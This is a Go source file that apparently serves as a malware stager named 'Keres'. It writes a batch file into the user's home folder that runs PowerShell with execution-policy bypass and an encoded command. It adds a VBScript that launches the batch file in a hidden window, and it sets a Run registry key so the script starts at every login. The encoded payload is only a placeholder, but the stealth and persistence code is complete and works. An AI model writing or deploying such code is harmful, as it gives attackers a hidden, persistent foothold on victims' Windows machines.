package main

import (
    "fmt"
    "io/ioutil"
    "os"
    "os/exec"
    
    "path/filepath"
)

func main() {
    // Define environment variables and paths
    homeDir, err := os.UserHomeDir()
    if err != nil {
        fmt.Println("Error getting user home directory:", err)
        return
    }
    batchFilePath := filepath.Join(homeDir, "Keres.bat")
    vbsScriptPath := filepath.Join(homeDir, "ExecKeres.vbs")

    encodedPSCmd := "A="

    // Create VBScript content
    vbsScriptContent := fmt.Sprintf(`
Set objShell = CreateObject("WScript.Shell")
batchFilePath = "%s"
objShell.Run batchFilePath, 0, True
`, batchFilePath)

    // Create batch file content
    batchFileContent := fmt.Sprintf(`
@echo off
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand %s
`, encodedPSCmd)

    // Create VBScript file
    if err := ioutil.WriteFile(vbsScriptPath, []byte(vbsScriptContent), 0644); err != nil {
        fmt.Println("file:", err)
        return
    }
    fmt.Println(" at:", vbsScriptPath)

    // Create batch file
    if err := ioutil.WriteFile(batchFilePath, []byte(batchFileContent), 0644); err != nil {
        fmt.Println("file:", err)
        return
    }

    // Execute VBScript file
    go func() {
        cmd := exec.Command("wscript", vbsScriptPath)
        if err := cmd.Run(); err != nil {
            fmt.Println("file:", err)
            return
        }
        fmt.Println("executed successfully.")
    }()

    
    go func() {
        regCmd := exec.Command("reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v", "Keres", "/t", "REG_SZ", "/d", vbsScriptPath, "/f")

        if err := regCmd.Run(); err != nil {
            fmt.Println("Error registering script to run at s:", err)
            return
        }
        
    }()

    
    select {}
    

    
    os.Exit(1)

}
